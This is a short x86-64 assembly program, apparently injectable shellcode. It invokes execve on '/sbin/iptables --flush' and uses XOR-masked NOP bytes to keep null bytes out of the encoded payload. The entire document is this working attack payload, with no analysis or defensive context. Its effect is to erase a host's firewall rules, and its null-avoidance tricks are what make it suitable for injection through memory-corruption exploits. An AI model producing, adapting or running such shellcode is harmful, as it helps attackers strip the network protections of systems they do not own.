global _start

section .text
_start:
    xor rax, rax
    push rax

    mov rbx, 0x906873756c662d2d         ; --flush with NOP to avoid null
    push rbx
    xor byte [rsp + 0x7], 0x90          ; replace NOP with 0x0
    mov rcx, rsp

    mov rbx, 0x909073656c626174         ; tables with NOPs to avoid null
    push    rbx
    xor word [rsp + 0x6], 0x9090
    mov     rbx, 0x70692f6e6962732f
    push    rbx
    mov     rdi, rsp

    push rax
    push rcx
    push rdi
    mov rsi, rsp

    add al, 0x3b
    syscall

